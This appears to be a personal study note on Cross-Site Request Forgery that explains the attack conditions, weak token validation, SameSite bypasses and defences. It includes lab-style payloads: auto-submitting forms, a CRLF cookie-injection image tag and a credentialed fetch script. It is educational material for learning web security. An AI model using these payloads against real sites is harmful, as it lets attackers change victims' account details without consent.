- **Request Forgery**: the attacker tricks the victim to execute an action **supported** by the system but not expected to be triggered in that very situation.

- **Cross-Site**: the request is originated from another source different from the victim system.  Attackers partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other.

Three conditions must be satisfied:
- **a relevant action**: there is an action within the application that the attacker has a reason to induce, like modifying users' permissions or changing a user's password; 
- **cookie-based session handling**: the application relies solely on session cookies to identify the user who has made the requests;
- **no unpredictable request parameters**: the requests that perform the action do not contain any parameters whose values the attacker cannot determine or guess. For example, when causing a user to change their password, the function is not vulnerable if an attacker needs to know the value of the existing password.

## Example

**Typically, the attacker will place a malicious HTML onto a website that they control and then induce victims to visit that website.**

Request for changing the user's email:

```http
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded Content-Length: 30 
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE 
email=wiener@normal-user.com
```

The attacker can construct a (fake) web page containing the following HTML:

```html
<html> 
	<body> 
	<form action="https://vulnerable-website.com/email/change" method="POST"> 
		<input type="hidden" name="email" value="pwned@evil-user.net" /> 
	</form> 
	<script> document.forms[0].submit(); </script> 
	</body> 
</html>
```

If a victim user visits the attacker's web page, the following will happen:

- the attacker's page will trigger an HTTP request to the vulnerable website;
- if the user is logged in to the vulnerable website, their browser will automatically include their session cookie in the request;
- the vulnerable website will process the request in the normal way, treat it as having been made by the victim user, and change their email address.

To add a CSRF token in the forged request, we can insert this line in the HTML form:

```html
<input type="hidden" name="csrf" value="<CSRF_TOKEN>" /> 
```

## Common flaws in CSRF token validation

- **Validation of CSRF token depends on request method**: some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.
- **Validation of CSRF token depends on token being present**: some applications correctly validate the CSRF token when it is present but skip the validation if the token is omitted.
- **CSRF token is not tied to the user session**: some applications do not check that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool. In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.
- **CSRF token is tied to a non-session cookie**: some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together, like in the case below. If the website contains any behavior that allows an attacker to set a cookie in a victim's browser, then an attack is possible: the attacker, once logged in, can inject his csrf cookie to the victim's browser. 

```http
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 68 
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

In the code below, the attacker is constructing a request that, *if runned by the victim*, will have the victim's session cookie and the (injected) attacker's csrf token and csrf cookie (since the csrf token is tied only to the non-session cookie):

###### Lab: CSRF where token is tied to non session cookie

```html
<html>
<body>
	<form method="post" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
		<input type="hidden" name="email" value="new_email@example.com">
		<input type="hidden" name="csrf" value="<ATTACKER_CSRF>">
	</form>
	<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=mySearch%0d%0aSet-Cookie:csrfKey=<ATTACKER_CSRFKEY>%3b%20SameSite=None"
onerror="document.forms[0].submit()">
</body>
</html>
```

Or simply inject the CSRF token (since the request will be sent by the victim, it'll already contain the victim's session and CSRF cookies):

```html
<script>  
const attacker_csrf = '<ATTACKER_CSRF>';

fetch('', {  
  method: 'POST',  
  credentials: 'include',  
  mode: 'no-cors',  
  body: `csrf=${attacker_csrf}&email=aaa@example.com`,  
});  
</script>
```

- **CSRF token is simply duplicated in a cookie**: some applications duplicate each token within a cookie and a request parameter. When a new request arrives, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie (*double submit defense against CSRF*).

```http
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 68 
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa 

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com`
```

In this situation, the attacker can forge a csrf token and cookie (also invent a new one) and place in the request that will be runned by the victim. For this type of attack, we can use the script [[#Lab CSRF where token is tied to non session cookie]].

## Bypassing SameSite cookie restrictions

In the context of SameSite cookie restrictions, a site is defined as the top-level domain (TLD), usually something like `.com` or `.net`, plus one additional level of the domain name. This is often referred to as the TLD+1.
When determining whether a request is same-site or not, the URL scheme is also taken into consideration
#### What's the difference between a site and an origin?

The difference between a site and an origin is their scope; a site encompasses multiple domain names, whereas an origin only includes one.

|                           |                                |                       |                            |
| ------------------------- | ------------------------------ | --------------------- | -------------------------- |
| **Request from**          | **Request to**                 | **Same-site?**        | **Same-origin?**           |
| `https://example.com`     | `https://example.com`          | Yes                   | Yes                        |
| `https://app.example.com` | `https://intranet.example.com` | Yes                   | No: mismatched domain name |
| `https://example.com`     | `https://example.com:8080`     | Yes                   | No: mismatched port        |
| `https://example.com`     | `https://example.co.uk`        | No: mismatched eTLD   | No: mismatched domain name |
| `https://example.com`     | `http://example.com`           | No: mismatched scheme | No: mismatched scheme      |

- **Bypassing SameSite Lax restrictions using GET requests**: servers don't always check whether they receive a `GET` or `POST` request to a given endpoint, even those that are expecting a form submission. In these cases, an attacker could perform a `GET` request submitting a `POST` form, like this:
```html
<form action="https://vulnerable-website.com/account/transfer-payment" method="POST"> 
	<input type="hidden" name="_method" value="GET"> 
	<input type="hidden" name="recipient" value="hacker"> 
	<input type="hidden" name="amount" value="1000000"> 
</form>
```

###### Lab: SameSite Lax bypass via method override
```html
<html> 
<body> 
	<script>
	    document.location = "https://vuln-site/my-account/change-email?email=pwned5336@example.com&_method=POST";
	</script>
</body> 
</html>
```

## Prevention

- **CSRF tokens** - A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. When attempting to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token in the request. This makes it very difficult for an attacker to construct a valid request on behalf of the victim.
    
- **SameSite cookies** - SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites.  SameSite can have 3 main values: 
	- `Strict`: cookies are transmitted only if the request originates from the same domain;
	- `Lax`: since 2021, Chrome enforces `Lax` SameSite restrictions by default (cookies are transmitted only if the request comes from the same domain or top-level navigation);
	- `None`: cookies are always transmitted.

- **Referer-based validation** - Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request has been originated from the application's own domain. This is generally less effective than CSRF token validation. 

##### Referer header
The *HTTP Referer header* (which is inadvertently misspelled in the HTTP specification) is an optional request header that contains the URL of the web page that linked to the resource that is being requested. It is generally added automatically by browsers when a user triggers an HTTP request (like when clicking a link or submitting a form).

##### Cookie jars
A **cookie jar** is a data structure used by applications or libraries to manage HTTP cookies associated with web requests and responses. it can be seen as a sort of a container that keeps track of all the cookies received and sent during a session and associates cookies with domains, paths, and other restrictions like the `Secure` or `HttpOnly` flags.


## [XSS](XSS%20(Cross-Site%20Scripting).md) vs CSRF

|                               | **XSS**                                                            | **CSRF**                                     |
| ----------------------------- | ------------------------------------------------------------------ | -------------------------------------------- |
| **What can the attacker do?** | Can trigger actions which<br>may not be supported<br>by the system | Can only exploit already implemented actions |
| **Always blind?**             | No                                                                 | Yes                                          |

- XSS gives more freedom
- XSS implies CSRF: if there is XSS, the legitimate CSRF token can be stolen
- CSRF protection makes XSS more difficult (CSRF tokens make difficult to do XSS from another domain), but doesn’t disable XSS and it has no effect on stored XSS

## [SSRF](SSRF%20(Server-Side%20Request%20Forgery).md) vs CSRF

|                   | **SSRF**                                             | **CSRF**                                                                                             |
| ----------------- | ---------------------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| **Executed from** | Server                                               | User client                                                                                          |
| **Objective**     | Lets an attacker send requests on behalf of a server | The attacker tricks the victim to execute an action from another source (controlled by the attacker) |
| **Auth needed?**  | No (ma we can exploit server privileges)             | Yes (it depends on the user session)                                                                 |
| **Always blind?** | No                                                   | Yes                                                                                                  |
